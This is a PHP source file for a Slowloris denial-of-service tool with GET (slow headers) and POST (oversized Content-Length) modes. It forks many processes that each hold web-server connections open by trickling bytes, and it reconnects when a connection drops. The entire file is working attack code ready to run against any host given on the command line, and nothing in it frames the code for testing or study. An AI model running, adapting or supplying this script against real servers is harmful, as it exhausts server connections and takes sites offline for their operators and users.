<?php
/* PHP Slowloris
 * Created by Reckz0r
 * Contains get based attack (slow headers) and post based attack (long content length)
 * 
 * Author: Reck/Reckz0r
 */

function usage($argv){
    print "Usage: ./{$argv[0]} <get or post> <number of processes> <server> [host]\n";
    die();
}

function attack_get($server, $host){
    $request  = "GET / HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
    $request .= "Keep-Alive: 900\r\n";
    $request .= "Content-Length: " . rand(1, 1000000) . "\r\n";
    $request .= "Accept: *.*\r\n";
    $request .= "X-a: " . rand(1, 10000) . "\r\n";

    $sockfd = @fsockopen($server, 80, $errno, $errstr);
    @fwrite($sockfd, $request);

    while (true){
        if (@fwrite($sockfd, "X-c:" . rand(1, 100000) . "\r\n")){
            echo ".";
               sleep(15);
           }else{
               echo "\nOne get attack failed to sent...\n";
               $sockfd = @fsockopen($server, 80, $errno, $errstr);
            @fwrite($sockfd, $request);
           }
    }
    
}

function attack_post($server, $host){
    $request  = "POST /".md5(rand())." HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
    $request .= "Keep-Alive: 900\r\n";
    $request .= "Content-Length: 1000000000\r\n";
    $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $request .= "Accept: *.*\r\n";

    $sockfd = @fsockopen($server, 80, $errno, $errstr);
    @fwrite($sockfd, $request);

    while (true){
        if (@fwrite($sockfd, ".") !== FALSE){
            echo ".";
               sleep(1);
           }else{
               echo "\nOne post attack failed to sent...\n";
               $sockfd = @fsockopen($server, 80, $errno, $errstr);
            @fwrite($sockfd, $request);
           }
    }
    
}

function main($argc, $argv){
    $status = 1;

    if ($argc == 4){
        $argv[4] = $argv[3];
    }else if ($argc < 5){
        usage($argv);
    }

    $pids = array();

    for ($i = 0; $i < $argv[2]; $i++){
        $pid = pcntl_fork();

        if ($pid == -1){
            die("Error forking!\n");
        }else if ($pid == 0){
        //child process
        if ($argv[1] == 'post') {
        attack_post($argv[3], $argv[4]);
        }elseif ($argv[1] == 'get') {
        attack_get($argv[3], $argv[4]);
        }else{
        die("Invalid method, use 'get' or 'post'\n");
        }
            exit(0);
        }else{
            //parent process
            $pids[] = $pid;
        }
    }

    foreach ($pids as $pid){
        pcntl_waitpid($pid, $status);
    }
}


main($argc, $argv);